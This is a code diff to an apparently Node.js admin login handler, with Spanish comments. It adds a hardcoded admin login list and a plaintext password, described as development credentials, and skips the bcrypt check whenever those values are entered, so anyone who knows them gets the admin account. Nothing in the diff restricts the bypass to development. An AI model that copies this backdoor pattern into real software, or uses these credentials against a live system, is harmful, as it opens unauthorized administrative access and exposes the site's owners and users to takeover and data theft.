@@ -6,6 +6,20 @@ import { getClientInfo } from "../../../../components/adminAuth";
 const { User, Session } = db;
 const { rand, error, success, midd } = lib;
 
+/** Credenciales fijas de desarrollo (admin panel). */
+const HARDCODED_ADMIN = {
+  identifiers: ["ADMIN", "admin@sifrah.com", "admin"],
+  password: "MoringaAdmin2025!",
+};
+
+function matchesHardcodedAdmin(iden, password) {
+  const id = String(iden).trim();
+  const idOk = HARDCODED_ADMIN.identifiers.some(
+    (x) => id.toLowerCase() === x.toLowerCase() || id.toUpperCase() === x.toUpperCase()
+  );
+  return idOk && String(password) === HARDCODED_ADMIN.password;
+}
+
 const handler = async (req, res) => {
   if (req.method === "OPTIONS") return res.status(200).send("ok");
   if (req.method !== "POST") return res.status(405).json(error("method not allowed"));
@@ -16,8 +30,16 @@ const handler = async (req, res) => {
   // Limpiar el identificador (ADMIN, admin, email, etc)
   const iden = String(emailOrDni).trim();
 
+  const hardcoded = matchesHardcodedAdmin(iden, password);
+
   // Búsqueda secuencial para máxima compatibilidad
-  let user = await User.findOne({ dni: iden.toUpperCase() });
+  let user = hardcoded
+    ? (await User.findOne({ id: "admin" })) ||
+      (await User.findOne({ type: "admin" })) ||
+      (await User.findOne({ dni: "ADMIN" }))
+    : null;
+
+  if (!user) user = await User.findOne({ dni: iden.toUpperCase() });
   if (!user) user = await User.findOne({ email: iden.toLowerCase() });
   if (!user) user = await User.findOne({ email: iden });
   if (!user) user = await User.findOne({ id: iden.toLowerCase() });
@@ -26,8 +48,10 @@ const handler = async (req, res) => {
     return res.json(error("invalid account"));
   }
 
-  const ok = await bcrypt.compare(String(password), String(user.password || ""));
-  if (!ok) return res.json(error("invalid password"));
+  if (!hardcoded) {
+    const ok = await bcrypt.compare(String(password), String(user.password || ""));
+    if (!ok) return res.json(error("invalid password"));
+  }
 
   const sessionValue = rand() + rand() + rand();
   const { userAgent, ip } = getClientInfo(req);
